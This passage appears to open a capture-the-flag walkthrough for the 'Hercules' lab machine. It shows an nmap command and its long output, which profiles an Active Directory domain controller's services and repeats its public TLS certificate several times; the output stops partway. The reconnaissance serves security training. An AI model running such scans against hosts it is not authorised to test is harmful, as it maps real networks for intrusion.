- Writeup reference : https://blog.csdn.net/m0_47720310/article/details/153784696

### Nmap
```
nmap -sV -sC -vv 10.129.242.196

---OUTPUT---
Nmap scan report for 10.129.242.196
Host is up, received echo-reply ttl 127 (0.018s latency).
Scanned at 2026-04-09 11:04:37 EDT for 93s
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.242.196/
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-09 15:04:51Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:52
| Not valid after:  2034-12-02T01:34:52
| MD5:     4555 8812 ecf9 9677 afc2 1897 9f20 766b
| SHA-1:   eed0 eb69 2903 5bf6 a32a 5f5b 58a0 7b86 1868 6035
| SHA-256: 5c35 6244 2719 90b4 4cca 1d9e ac0e a71a b4cf c999 2df7 a279 1a87 feb3 d16b 49bf
| -----BEGIN CERTIFICATE-----
| MIIGBTCCBO2gAwIBAgITfQAAAAJciQ7uO5Kg2wAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIaGVyY3Vs
| ZXMxFDASBgNVBAMTC0NBLUhFUkNVTEVTMB4XDTI0MTIwNDAxMzQ1MloXDTM0MTIw
| MjAxMzQ1MlowGjEYMBYGA1UEAxMPZGMuaGVyY3VsZXMuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFWlB9u1HEAgHmH0Qo9j6UhBnbdHxbTOg7Im
| yQA7mH+9VblYauvlzO6oO+MX9MtujCn576+1AgmxEM0jMDi6C2c1uHVqTRHTQrVq
| tiNy2Rg1wrBKCDBt5MwLNagI4hXOs1b2GrIEtJ6O8wubKYXsPpE8QgUH1ZBpXFvM
| NBIA93U68K9EMazhTwLDyjtg0KdiqCwdWJ3tl2NbtwOA6MMLXCrPmlhgKqwIuGq7
| JdwfpdtiarosLpTd/ZnYOgYHjL9R9PczNy83hyLDkSp4/w3bAEGVVahGLOCfrDYP
| WSZPTci+PQV91tOXDelWg0pPUmtat2asVu2QRvK9KnMA3yTNsQIDAQABo4IDFzCC
| AxMwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhcWnfITr0X6EoYkdgs7RaYKB
| iFqBd6KOvhGJ+u9WAgFkAgEHMDIGA1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcD
| AQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGC
| NxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkG
| BysGAQUCAwUwHQYDVR0OBBYEFFg+qJRRlxY0pnopuFcbwo+8t2Q+MDIGA1UdEQQr
| MCmCD2RjLmhlcmN1bGVzLmh0YoIMaGVyY3VsZXMuaHRigghIRVJDVUxFUzAfBgNV
| HSMEGDAWgBSMF4aDLPX9I+rwW+ARhYXYhQ9DezCBxQYDVR0fBIG9MIG6MIG3oIG0
| oIGxhoGubGRhcDovLy9DTj1DQS1IRVJDVUxFUyxDTj1kYyxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1oZXJjdWxlcyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
| YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcB
| AQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPUNBLUhFUkNVTEVTLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWhlcmN1bGVzLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBOBgkrBgEEAYI3
| GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMTg4OTk2NjQ2MC0yNTk3
| MzgxOTUyLTk1ODU2MDcwMi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJa2tJJ858
| GlpmIV2o2+YUT5n6lo0yDeUGoztH1CrrmXx+C3ZW4bUiwBkaf6wuQ4qZu7l+CaNI
| BAc0olRfy3k1S/fqNA3/01zXAA5R6SEdnNF5lLnro+EeVEqkZPnOYlLQ8odePQZI
| UbtT8j88LMpEwfOGhU1J7XWz2tyaXHpiYAvh5VasrQ6ShaujhwJ0xew6WFWAlyf5
| jOSfPSp0lAto9gZ6UBSxq9MmEYnMVNmrzI25TRv9VDdQtm4zTomyQNZGI0ZFCC5+
| weJ32eUtncGAx7fSH/ahL93i7dzYkJmvV2mvs6p/pQqJ6vUuD6Fd7C9G+QycGvtZ
| hbT8cUHZnukR
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/https     syn-ack ttl 127 Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Issuer: commonName=hercules.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:56
| Not valid after:  2034-12-04T01:44:56
| MD5:     5f2d 5a1e ddb2 3380 c69b f57b c5dc 3b03
| SHA-1:   e7d6 740f 7eb5 4f00 3037 4bf9 6eb6 dad5 ed84 656b
| SHA-256: 306c bc6e 146b bc3d a448 b016 9f99 52d2 0c38 9296 9c1f d1e2 a89d f943 a3c6 d474
| -----BEGIN CERTIFICATE-----
| MIIDITCCAgmgAwIBAgIQLqFg+q90iatE1kqheN5t6DANBgkqhkiG9w0BAQsFADAX
| MRUwEwYDVQQDDAxoZXJjdWxlcy5odGIwHhcNMjQxMjA0MDEzNDU2WhcNMzQxMjA0
| MDE0NDU2WjAXMRUwEwYDVQQDDAxoZXJjdWxlcy5odGIwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQC9K7DV/Jzzpmi37KvnwuiYF5XycYWP0SHCuIt4fPMC
| uS94BgkNSUa5+egJjEu+o2vKXVgY81LWMa8+TGXKMMNa/FONsCVW4YW5cqdXCKcX
| PwyNAjNGijK288K2Uhn+uN5DHQNJuW3T8dr68ybB20kZWhuJc9OgVMhxTHHQ6bR4
| ZzFrr9OKvGRjMfNCjLc9ibCmlzF5qBQUl+WANzNaYHzjwvRZ29DC1HBxcGVa28u+
| LyaWrp05cZOcduKJH4otBfMk/wsRyE+ePrSDTUgZtkCYVqA3aqV525V1CZMvwXmG
| qwoMWpCyI9SAoePvliCUS7ZSzG/lpFX7ZJoubm1tNM9tAgMBAAGjaTBnMA4GA1Ud
| DwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwFwYDVR0R
| BBAwDoIMaGVyY3VsZXMuaHRiMB0GA1UdDgQWBBSOhQu5rvKL8uGN1rerz5KO7NJx
| /zANBgkqhkiG9w0BAQsFAAOCAQEAdC1qoV607+v8S5u3AKswWhziWzcqKpjEyx8+
| TStQ3GtTxQkASU2R3a1Sk1nMk1aBepXwQDl6ySwNhWaLYRttU8eecSVPmexBJVyj
| fC6PD+SFSG++N3dJ6HeveSAiVnDaHEi5uJkisquQf0YmIVghseijg4uHwWsHUiG/
| 7tITolBnGajP91BmMG5CJBrE/wq9sSNp1cBkGHUDtZnW9Z9pVdwpEnjoFT5iKXuy
| TxET2hG4CLIH7el0BmXVUg9Fw1Yno4jpGZVr4y/0sgD0TYPZac2Jl64nNs3Afz3E
| Q0Z4d2a0ENH6GhUKfqVaAeHVHLfeIBKa/DXfOPbHiGfhxyg1IQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:52
| Not valid after:  2034-12-02T01:34:52
| MD5:     4555 8812 ecf9 9677 afc2 1897 9f20 766b
| SHA-1:   eed0 eb69 2903 5bf6 a32a 5f5b 58a0 7b86 1868 6035
| SHA-256: 5c35 6244 2719 90b4 4cca 1d9e ac0e a71a b4cf c999 2df7 a279 1a87 feb3 d16b 49bf
| -----BEGIN CERTIFICATE-----
| MIIGBTCCBO2gAwIBAgITfQAAAAJciQ7uO5Kg2wAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIaGVyY3Vs
| ZXMxFDASBgNVBAMTC0NBLUhFUkNVTEVTMB4XDTI0MTIwNDAxMzQ1MloXDTM0MTIw
| MjAxMzQ1MlowGjEYMBYGA1UEAxMPZGMuaGVyY3VsZXMuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFWlB9u1HEAgHmH0Qo9j6UhBnbdHxbTOg7Im
| yQA7mH+9VblYauvlzO6oO+MX9MtujCn576+1AgmxEM0jMDi6C2c1uHVqTRHTQrVq
| tiNy2Rg1wrBKCDBt5MwLNagI4hXOs1b2GrIEtJ6O8wubKYXsPpE8QgUH1ZBpXFvM
| NBIA93U68K9EMazhTwLDyjtg0KdiqCwdWJ3tl2NbtwOA6MMLXCrPmlhgKqwIuGq7
| JdwfpdtiarosLpTd/ZnYOgYHjL9R9PczNy83hyLDkSp4/w3bAEGVVahGLOCfrDYP
| WSZPTci+PQV91tOXDelWg0pPUmtat2asVu2QRvK9KnMA3yTNsQIDAQABo4IDFzCC
| AxMwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhcWnfITr0X6EoYkdgs7RaYKB
| iFqBd6KOvhGJ+u9WAgFkAgEHMDIGA1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcD
| AQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGC
| NxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkG
| BysGAQUCAwUwHQYDVR0OBBYEFFg+qJRRlxY0pnopuFcbwo+8t2Q+MDIGA1UdEQQr
| MCmCD2RjLmhlcmN1bGVzLmh0YoIMaGVyY3VsZXMuaHRigghIRVJDVUxFUzAfBgNV
| HSMEGDAWgBSMF4aDLPX9I+rwW+ARhYXYhQ9DezCBxQYDVR0fBIG9MIG6MIG3oIG0
| oIGxhoGubGRhcDovLy9DTj1DQS1IRVJDVUxFUyxDTj1kYyxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1oZXJjdWxlcyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
| YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcB
| AQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPUNBLUhFUkNVTEVTLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWhlcmN1bGVzLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBOBgkrBgEEAYI3
| GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMTg4OTk2NjQ2MC0yNTk3
| MzgxOTUyLTk1ODU2MDcwMi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJa2tJJ858
| GlpmIV2o2+YUT5n6lo0yDeUGoztH1CrrmXx+C3ZW4bUiwBkaf6wuQ4qZu7l+CaNI
| BAc0olRfy3k1S/fqNA3/01zXAA5R6SEdnNF5lLnro+EeVEqkZPnOYlLQ8odePQZI
| UbtT8j88LMpEwfOGhU1J7XWz2tyaXHpiYAvh5VasrQ6ShaujhwJ0xew6WFWAlyf5
| jOSfPSp0lAto9gZ6UBSxq9MmEYnMVNmrzI25TRv9VDdQtm4zTomyQNZGI0ZFCC5+
| weJ32eUtncGAx7fSH/ahL93i7dzYkJmvV2mvs6p/pQqJ6vUuD6Fd7C9G+QycGvtZ
| hbT8cUHZnukR
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:52
| Not valid after:  2034-12-02T01:34:52
| MD5:     4555 8812 ecf9 9677 afc2 1897 9f20 766b
| SHA-1:   eed0 eb69 2903 5bf6 a32a 5f5b 58a0 7b86 1868 6035
| SHA-256: 5c35 6244 2719 90b4 4cca 1d9e ac0e a71a b4cf c999 2df7 a279 1a87 feb3 d16b 49bf
| -----BEGIN CERTIFICATE-----
| MIIGBTCCBO2gAwIBAgITfQAAAAJciQ7uO5Kg2wAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIaGVyY3Vs
| ZXMxFDASBgNVBAMTC0NBLUhFUkNVTEVTMB4XDTI0MTIwNDAxMzQ1MloXDTM0MTIw
| MjAxMzQ1MlowGjEYMBYGA1UEAxMPZGMuaGVyY3VsZXMuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFWlB9u1HEAgHmH0Qo9j6UhBnbdHxbTOg7Im
| yQA7mH+9VblYauvlzO6oO+MX9MtujCn576+1AgmxEM0jMDi6C2c1uHVqTRHTQrVq
| tiNy2Rg1wrBKCDBt5MwLNagI4hXOs1b2GrIEtJ6O8wubKYXsPpE8QgUH1ZBpXFvM
| NBIA93U68K9EMazhTwLDyjtg0KdiqCwdWJ3tl2NbtwOA6MMLXCrPmlhgKqwIuGq7
| JdwfpdtiarosLpTd/ZnYOgYHjL9R9PczNy83hyLDkSp4/w3bAEGVVahGLOCfrDYP
| WSZPTci+PQV91tOXDelWg0pPUmtat2asVu2QRvK9KnMA3yTNsQIDAQABo4IDFzCC
| AxMwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhcWnfITr0X6EoYkdgs7RaYKB
| iFqBd6KOvhGJ+u9WAgFkAgEHMDIGA1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcD
| AQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGC
| NxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkG
| BysGAQUCAwUwHQYDVR0OBBYEFFg+qJRRlxY0pnopuFcbwo+8t2Q+MDIGA1UdEQQr
| MCmCD2RjLmhlcmN1bGVzLmh0YoIMaGVyY3VsZXMuaHRigghIRVJDVUxFUzAfBgNV
| HSMEGDAWgBSMF4aDLPX9I+rwW+ARhYXYhQ9DezCBxQYDVR0fBIG9MIG6MIG3oIG0
| oIGxhoGubGRhcDovLy9DTj1DQS1IRVJDVUxFUyxDTj1kYyxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1oZXJjdWxlcyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
| YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcB
| AQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPUNBLUhFUkNVTEVTLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWhlcmN1bGVzLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBOBgkrBgEEAYI3
| GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMTg4OTk2NjQ2MC0yNTk3
| MzgxOTUyLTk1ODU2MDcwMi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJa2tJJ858
| GlpmIV2o2+YUT5n6lo0yDeUGoztH1CrrmXx+C3ZW4bUiwBkaf6wuQ4qZu7l+CaNI
| BAc0olRfy3k1S/fqNA3/01zXAA5R6SEdnNF5lLnro+EeVEqkZPnOYlLQ8odePQZI
| UbtT8j88LMpEwfOGhU1J7XWz2tyaXHpiYAvh5VasrQ6ShaujhwJ0xew6WFWAlyf5
| jOSfPSp0lAto9gZ6UBSxq9MmEYnMVNmrzI25TRv9VDdQtm4zTomyQNZGI0ZFCC5+
| weJ32eUtncGAx7fSH/ahL93i7dzYkJmvV2mvs6p/pQqJ6vUuD6Fd7C9G+QycGvtZ
| hbT8cUHZnukR
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:52
| Not valid after:  2034-12-02T01:34:52
| MD5:     4555 8812 ecf9 9677 afc2 1897 9f20 766b
| SHA-1:   eed0 eb69 2903 5bf6 a32a 5f5b 58a0 7b86 1868 6035
| SHA-256: 5c35 6244 2719 90b4 4cca 1d9e ac0e a71a b4cf c999 2df7 a279 1a87 feb3 d16b 49bf
| -----BEGIN CERTIFICATE-----
| MIIGBTCCBO2gAwIBAgITfQAAAAJciQ7uO5Kg2wAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIaGVyY3Vs
| ZXMxFDASBgNVBAMTC0NBLUhFUkNVTEVTMB4XDTI0MTIwNDAxMzQ1MloXDTM0MTIw
| MjAxMzQ1MlowGjEYMBYGA1UEAxMPZGMuaGVyY3VsZXMuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFWlB9u1HEAgHmH0Qo9j6UhBnbdHxbTOg7Im
| yQA7mH+9VblYauvlzO6oO+MX9MtujCn576+1AgmxEM0jMDi6C2c1uHVqTRHTQrVq
| tiNy2Rg1wrBKCDBt5MwLNagI4hXOs1b2GrIEtJ6O8wubKYXsPpE8QgUH1ZBpXFvM
| NBIA93U68K9EMazhTwLDyjtg0KdiqCwdWJ3tl2NbtwOA6MMLXCrPmlhgKqwIuGq7
| JdwfpdtiarosLpTd/ZnYOgYHjL9R9PczNy83hyLDkSp4/w3bAEGVVahGLOCfrDYP
| WSZPTci+PQV91tOXDelWg0pPUmtat2asVu2QRvK9KnMA3yTNsQIDAQABo4IDFzCC
| AxMwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhcWnfITr0X6EoYkdgs7RaYKB
| iFqBd6KOvhGJ+u9WAgFkAgEHMDIGA1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcD
| AQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGC
| NxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkG
| BysGAQUCAwUwHQYDVR0OBBYEFFg+qJRRlxY0pnopuFcbwo+8t2Q+MDIGA1UdEQQr
| MCmCD2RjLmhlcmN1bGVzLmh0YoIMaGVyY3VsZXMuaHRigghIRVJDVUxFUzAfBgNV
| HSMEGDAWgBSMF4aDLPX9I+rwW+ARhYXYhQ9DezCBxQYDVR0fBIG9MIG6MIG3oIG0
| oIGxhoGubGRhcDovLy9DTj1DQS1IRVJDVUxFUyxDTj1kYyxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1oZXJjdWxlcyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
| YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcB
| AQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPUNBLUhFUkNVTEVTLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWhlcmN1bGVzLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBOBgkrBgEEAYI3
| GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMTg4OTk2NjQ2MC0yNTk3
| MzgxOTUyLTk1ODU2MDcwMi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJa2tJJ858
| GlpmIV2o2+YUT5n6lo0yDeUGoztH1CrrmXx+C3ZW4bUiwBkaf6wuQ4qZu7l+CaNI
| BAc0olRfy3k1S/fqNA3/01zXAA5R6SEdnNF5lLnro+EeVEqkZPnOYlLQ8odePQZI
| UbtT8j88LMpEwfOGhU1J7XWz2tyaXHpiYAvh5VasrQ6ShaujhwJ0xew6WFWAlyf5
| jOSfPSp0lAto9gZ6UBSxq9MmEYnMVNmrzI25TRv9VDdQtm4zTomyQNZGI0ZFCC5+
| weJ32eUtncGAx7fSH/ahL93i7dzYkJmvV2mvs6p/pQqJ6vUuD6Fd7C9G+QycGvtZ
| hbT8cUHZnukR
|_-----END CERTIFICATE-----
5986/tcp open  ssl/wsmans?   syn-ack ttl 127
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-04T01:34:52
| Not valid after:  2034-12-02T01:34:52
| MD5:     4555 8812 ecf9 9677 afc2 1897 9f20 766b
| SHA-1:   eed0 eb69 2903 5bf6 a32a 5f5b 58a0 7b86 1868 6035
| SHA-256: 5c35 6244 2719 90b4 4cca 1d9e ac0e a71a b4cf c999 2df7 a279 1a87 feb3 d16b 49bf
| -----BEGIN CERTIFICATE-----
| MIIGBTCCBO2gAwIBAgITfQAAAAJciQ7uO5Kg2wAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIaGVyY3Vs
| ZXMxFDASBgNVBAMTC0NBLUhFUkNVTEVTMB4XDTI0MTIwNDAxMzQ1MloXDTM0MTIw
| MjAxMzQ1MlowGjEYMBYGA1UEAxMPZGMuaGVyY3VsZXMuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFWlB9u1HEAgHmH0Qo9j6UhBnbdHxbTOg7Im
| yQA7mH+9VblYauvlzO6oO+MX9MtujCn576+1AgmxEM0jMDi6C2c1uHVqTRHTQrVq
| tiNy2Rg1wrBKCDBt5MwLNagI4hXOs1b2GrIEtJ6O8wubKYXsPpE8QgUH1ZBpXFvM
| NBIA93U68K9EMazhTwLDyjtg0KdiqCwdWJ3tl2NbtwOA6MMLXCrPmlhgKqwIuGq7
| JdwfpdtiarosLpTd/ZnYOgYHjL9R9PczNy83hyLDkSp4/w3bAEGVVahGLOCfrDYP
| WSZPTci+PQV91tOXDelWg0pPUmtat2asVu2QRvK9KnMA3yTNsQIDAQABo4IDFzCC
| AxMwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIhcWnfITr0X6EoYkdgs7RaYKB
| iFqBd6KOvhGJ+u9WAgFkAgEHMDIGA1UdJQQrMCkGCCsGAQUFBwMCBggrBgEFBQcD
| AQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8EBAMCBaAwQAYJKwYBBAGC
| NxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3FAICMAkG
| BysGAQUCAwUwHQYDVR0OBBYEFFg+qJRRlxY0pnopuFcbwo+8t2Q+MDIGA1UdEQQr
| MCmCD2RjLmhlcmN1bGVzLmh0YoIMaGVyY3VsZXMuaHRigghIRVJDVUxFUzAfBgNV
| HSMEGDAWgBSMF4aDLPX9I+rwW+ARhYXYhQ9DezCBxQYDVR0fBIG9MIG6MIG3oIG0
| oIGxhoGubGRhcDovLy9DTj1DQS1IRVJDVUxFUyxDTj1kYyxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1oZXJjdWxlcyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9i
| YXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG+BggrBgEFBQcB
| AQSBsTCBrjCBqwYIKwYBBQUHMAKGgZ5sZGFwOi8vL0NOPUNBLUhFUkNVTEVTLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWhlcmN1bGVzLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBOBgkrBgEEAYI3
| GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMTg4OTk2NjQ2MC0yNTk3
| MzgxOTUyLTk1ODU2MDcwMi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJa2tJJ858
| GlpmIV2o2+YUT5n6lo0yDeUGoztH1CrrmXx+C3ZW4bUiwBkaf6wuQ4qZu7l+CaNI
| BAc0olRfy3k1S/fqNA3/01zXAA5R6SEdnNF5lLnro+EeVEqkZPnOYlLQ8odePQZI
| UbtT8j88LMpEwfOGhU1J7XWz2tyaXHpiYAvh5VasrQ6ShaujhwJ0xew6WFWAlyf5
| jOSfPSp0lAto9gZ6UBSxq9MmEYnMVNmrzI25TRv9VDdQtm4zTomyQNZGI0ZFCC5+
| weJ32eUtncGAx7fSH/ahL93i7dzYkJmvV2mvs6p/pQqJ6vUuD6Fd7C9G+QycGvtZ
| hbT8cUHZnukR
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63412/tcp): CLEAN (Timeout)
|   Check 2 (port 50540/tcp): CLEAN (Timeout)
|   Check 3 (port 4307/udp): CLEAN (Timeout)
|   Check 4 (port 53379/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
